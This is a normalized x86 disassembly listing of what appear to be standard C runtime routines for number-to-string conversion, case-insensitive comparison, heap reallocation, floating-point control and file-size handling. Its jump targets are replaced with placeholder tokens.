mov ebx [ ebp + 0x10 ]
push esi
mov esi ebx
mov [ ebp - 0x4 ] eax
push edi
cmp [ ebp + 0x1c ] al
je r-xdata
mov edi [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
push 0x2d
pop eax
mov [ ebx ] ax
lea esi [ ebx + 0x2 ]
xor eax eax
inc eax
neg ecx
mov [ ebp - 0x4 ] eax
adc edx 0x0
neg edx
add eax 0x30
add eax 0x57
jmp r-xdata
cmp edi [ ebp + 0x14 ]
jb r-xdata
test ecx ecx
je r-xdata
mov [ esi ] ax
add esi 0x2
inc edi
test edx edx
jne r-xdata
push 0x0
push [ ebp + 0x18 ]
push edx
push ecx
call sub_449720
mov [ ebp - 0x4 ] ecx
mov ecx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] ebx
cmp eax 0x9
jbe r-xdata
cmp edi [ ebp + 0x14 ]
mov edi [ ebp - 0x8 ]
jb r-xdata
xor eax eax
mov [ esi ] ax
sub esi 0x2
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov [ eax ] cx
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov ax [ edi ]
movzx ecx [ esi ]
mov [ esi ] ax
sub esi 0x2
mov [ edi ] cx
add edi 0x2
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4452a3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
call sub_42fef5
push 0x16
xor eax eax
mov [ ecx ] 0x0
cmp [ ebp + 0x18 ] al
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x14 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_42fef5
push 0x22
jmp r-xdata
push [ ebp + 0x18 ]
push esi
push edx
push ecx
push [ ebp + 0x8 ]
call sub_445040
add esp 0x14
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
sub_445302
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
call sub_42fef5
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] al
mov [ ecx ] ax
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x14 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_42fef5
push 0x22
jmp r-xdata
push [ ebp + 0x18 ]
push esi
push edx
push ecx
push [ ebp + 0x8 ]
call sub_4450b5
add esp 0x14
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
sub_445361
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
call sub_42fef5
push 0x16
xor eax eax
mov [ ecx ] 0x0
cmp [ ebp + 0x1c ] al
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x18 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_42fef5
push 0x22
jmp r-xdata
push [ ebp + 0x1c ]
push esi
push edx
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445143
add esp 0x18
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
sub_4453c3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
call sub_42fef5
push 0x16
xor eax eax
cmp [ ebp + 0x1c ] al
mov [ ecx ] ax
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x18 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_42fef5
push 0x22
jmp r-xdata
push [ ebp + 0x1c ]
push esi
push edx
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4451e5
add esp 0x18
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
sub_445425
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445143
mov eax [ ebp + 0x10 ]
add esp 0x18
mov esp ebp
pop ebp
retn
sub_445468
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445361
add esp 0x18
mov esp ebp
pop ebp
retn
sub_4454a9
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4451e5
mov eax [ ebp + 0x10 ]
add esp 0x18
mov esp ebp
pop ebp
retn
sub_4454ec
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4453c3
add esp 0x18
mov esp ebp
pop ebp
retn
sub_44552d
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445040
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_445564
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4452a3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_445599
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4450b5
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4455d0
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445302
add esp 0x14
mov esp ebp
pop ebp
retn
sub_445605
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445040
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_44563c
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4452a3
add esp 0x14
mov esp ebp
pop ebp
retn
sub_445671
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4450b5
mov eax [ ebp + 0xc ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4456a8
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445302
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4456dd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445143
mov eax [ ebp + 0x10 ]
add esp 0x18
pop ebp
retn
sub_4456ff
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445361
add esp 0x18
pop ebp
retn
sub_44571f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4451e5
mov eax [ ebp + 0x10 ]
add esp 0x18
pop ebp
retn
sub_445741
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4453c3
add esp 0x18
pop ebp
retn
sub_445761
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445040
mov eax [ ebp + 0xc ]
add esp 0x14
pop ebp
retn
sub_44579d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4450b5
mov eax [ ebp + 0xc ]
add esp 0x14
pop ebp
retn
sub_4457d9
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44586e
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
pop edi
movzx eax si
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_44586e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_41cb44
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0xc ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_445c08
lea ecx [ ebp - 0xc ]
movzx edi ax
movzx eax [ esi ]
lea ebx [ ebx + 0x2 ]
push ecx
push eax
call sub_445c08
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_44594e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
sub_445981
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
sub_4459b4
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_42d0e4
pop ecx
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
push edi
call sub_42d0aa
pop ecx
jmp r-xdata
pop edi
pop ebp
retn
push esi
push edi
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
test eax eax
je r-xdata
call sub_42fef5
mov [ eax ] 0xc
xor eax eax
call sub_42c935
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4297a7
pop ecx
test eax eax
je r-xdata
pop esi
sub_445a3e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
push esi
jl r-xdata
xor esi esi
call sub_445a98
mov edx [ ebp + 0xc ]
mov esi eax
mov ecx [ ebp + 0x8 ]
not edx
and ecx [ ebp + 0xc ]
or edx 0xffff807f
and edx esi
or edx ecx
push edx
call sub_445ab6
pop ecx
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_445a98
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jl r-xdata
xor eax eax
stmxcsr [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_445ab6
push 0x8
push r--data
call sub_40d260
cmp [ rw-data ] 0x1
jl r-xdata
call sub_40d2a6
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_445b6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
not ecx
and cx [ ebp - 0x4 ]
and eax [ ebp + 0xc ]
or cx ax
mov [ ebp - 0x8 ] cx
fldcw [ ebp - 0x8 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_445b9b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp - 0x4 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0xc ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0xc ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
mov esp ebp
pop ebp
retn
fldpi
fstp [ ebp - 0xc ]
fwait
sub_445c08
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x18
cmp [ ebp + 0x8 ] ax
je r-xdata
mov esp ebp
pop ebp
retn
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_41cb44
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_447ba4
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
test eax eax
jne r-xdata
movzx eax cx
mov [ ebp - 0x8 ] eax
jmp r-xdata
add cx 0x20
movzx eax cx
mov [ ebp - 0x8 ] eax
mov cx ax
mov ax [ ebp - 0x4 ]
mov ax [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x94 ]
movzx eax [ eax + ecx ]
mov ax [ ebp + 0x8 ]
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax ax
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax ax
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_445cf0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_445d51
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
push ebx
push edi
call sub_430684
neg eax
sbb ebx ebx
xor edi edi
push edi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
inc ebx
mov [ esi ] edi
push edi
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
add eax eax
push eax
call sub_42d0e4
mov esi eax
pop ecx
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_42febf
xor eax eax
jmp r-xdata
pop esi
push esi
call sub_42d0aa
mov eax edi
push [ ebp - 0x4 ]
push esi
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
pop ecx
pop edi
pop ebx
mov ecx [ ebp + 0xc ]
mov eax esi
mov esi edi
xor edi edi
inc edi
mov [ ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_42febf
pop ecx
jmp r-xdata
sub_445e18
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
push edi
call sub_430684
push [ ebp + 0x8 ]
neg eax
sbb edi edi
and [ esi ] 0x0
inc edi
push edi
call sub_42ab9b
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
push eax
call sub_42d0e4
mov esi eax
pop ecx
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_42febf
xor eax eax
jmp r-xdata
pop esi
xor edi edi
push [ ebp - 0x4 ]
push esi
push [ ebp + 0x8 ]
push edi
call sub_42abd4
add esp 0x10
test eax eax
jne r-xdata
pop ecx
pop edi
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax esi
mov esi edi
inc edi
mov [ ecx ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_42febf
pop ecx
push esi
call sub_42d0aa
mov eax edi
sub_445ed4
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43901e
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0xc ]
mov eax [ edi ]
mov esi [ eax ]
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_42fef5
push 0x9
pop esi
mov [ eax ] esi
mov eax [ edi + 0x4 ]
push [ eax + 0x4 ]
push [ eax ]
push esi
call sub_44602f
add esp 0xc
mov esi eax
jmp r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445f50
mov eax esi
call sub_40d2a6
retn 0xc
sub_445f5c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_445ed4
mov esp ebp
pop ebp
retn
sub_445fbe
mov eax [ ecx ]
push esi
push edi
mov edi [ eax ]
mov eax edi
and eax 0x3f
mov esi edi
sar esi 0x6
imul edx eax 0x30
mov eax [ esi * 4 + rw-data ]
test [ eax + edx + 0x28 ] 0x1
je r-xdata
call sub_42fef5
push 0x9
pop ecx
mov [ eax ] ecx
mov eax ecx
mov eax [ ecx + 0x4 ]
push [ eax + 0x4 ]
push [ eax ]
push edi
call sub_44602f
add esp 0xc
jmp r-xdata
pop edi
pop esi
retn
sub_446013
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_4461c0
add esp 0xc
neg eax
sbb eax eax
pop ebp
retn
sub_44602f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
call sub_43f625
mov ecx eax
mov [ ebp - 0x10 ] eax
and ecx edx
mov [ ebp - 0xc ] edx
add esp 0x10
cmp ecx 0xffffffff
jne r-xdata
push 0x2
push esi
push esi
push edi
call sub_43f625
mov ecx eax
add esp 0x10
and ecx edx
cmp ecx 0xffffffff
je r-xdata
call sub_42fef5
mov eax [ eax ]
jmp r-xdata
push ebx
mov ebx [ ebp + 0xc ]
sub ebx eax
mov eax [ ebp + 0x10 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp eax esi
jg r-xdata
jg r-xdata
push esi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push edi
call sub_43f625
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
jl r-xdata
push 0x1
push 0x1000
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
cmp ebx esi
jbe r-xdata
xor eax eax
call sub_42fef5
mov eax [ eax ]
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_43f625
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp ebx esi
jae r-xdata
push 0x8000
push edi
call sub_42b0c1
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_42fef5
mov [ eax ] 0xc
jmp r-xdata
pop ebx
push edi
call sub_43929b
pop ecx
push eax
call [ SetEndOfFile@IAT ]
test eax eax
jne r-xdata
mov eax ebx
jg r-xdata
call sub_42fef5
push esi
mov edi [ eax ]
call sub_42d0aa
pop ecx
mov eax edi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0xd
call sub_42fee2
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
jmp r-xdata
call sub_42fee2
cmp [ eax ] 0x5
jne r-xdata
cdq
sub ebx eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
test eax eax
jg r-xdata
mov eax 0x1000
jmp r-xdata
cmp ebx 0x1000
jb r-xdata
call sub_42fef5
mov [ eax ] 0xd
jl r-xdata
push eax
push esi
push edi
call sub_432b57
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push edi
call sub_42b0c1
push esi
call sub_42d0aa
add esp 0xc
xor esi esi
test ebx ebx
jne r-xdata
test eax eax
jl r-xdata
sub_4461c0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_42fee2
push 0x9
and [ eax ] 0x0
pop eax
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
push 0x9
cmp esi [ rw-data ]
jae r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call sub_445f5c
pop ecx
pop ecx
jmp r-xdata
jl r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
push 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jae r-xdata
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
sub_44625b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
and eax 0x3f
mov edx [ ebp + 0xc ]
push ebx
sar ecx 0x6
push esi
push edi
imul edi eax 0x30
mov eax [ ecx * 4 + rw-data ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
and [ eax + edi + 0x28 ] 0xfb
cmp [ edx ] 0xa
jne r-xdata
sub esi edx
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ edx + 0x1 ]
or [ eax + edi + 0x28 ] 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
